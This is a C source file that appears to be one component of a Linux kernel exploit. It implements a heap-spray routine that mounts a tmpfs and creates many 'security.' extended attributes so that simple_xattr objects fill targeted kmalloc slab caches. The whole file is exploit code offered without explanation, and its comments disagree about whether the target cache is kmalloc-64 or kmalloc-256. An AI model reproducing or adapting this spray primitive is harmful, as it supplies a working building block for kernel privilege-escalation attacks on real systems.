#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/xattr.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mount.h>
#include "log.h"
#include "simple_xattr.h"

/**
 * spray_simple_xattr(): Spray the heap with `simple_xattr` objects
 * @spray_size: Number of objects to put into `kmalloc-64`
 */
void spray_simple_xattr(char *filename, uint32_t spray_size) {

    char attribute_name[ATTRIBUTE_NAME_LEN];

    /* Mount a new tmpfs to be able to set security xattr */
    if (mkdir("/tmp/tmpfs", S_IRWXU) == -1 && errno != EEXIST)
    {
		do_error_exit("mkdir");
	}
    if (mount(NULL, "/tmp/tmpfs", "tmpfs", 0, NULL) == -1)
    {
		do_error_exit("mount");
	}
    
    /* Create a file to the set attributes */

    int fd = creat(filename, 0644);
    close(fd);

    for (uint64_t i = 0; i < spray_size; i++) {
        /* Need that the name is allocated within `kmalloc-256` */
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%215lu-%s", i, XATTR_DELETION_NAME);
        create_xattr(filename, attribute_name);
    }
}

/**
 * create_xattr(): Add an xattribute to a file with the value "value"
 * @filename: Name of the concerned file
 * @attribute_name: Attribute name
 */
void create_xattr(const char *filename, char *attribute_name) {

    if (setxattr(filename, attribute_name, XATTR_VALUE, strlen(XATTR_VALUE), XATTR_CREATE) < 0)
        do_error_exit("setxattr");
}
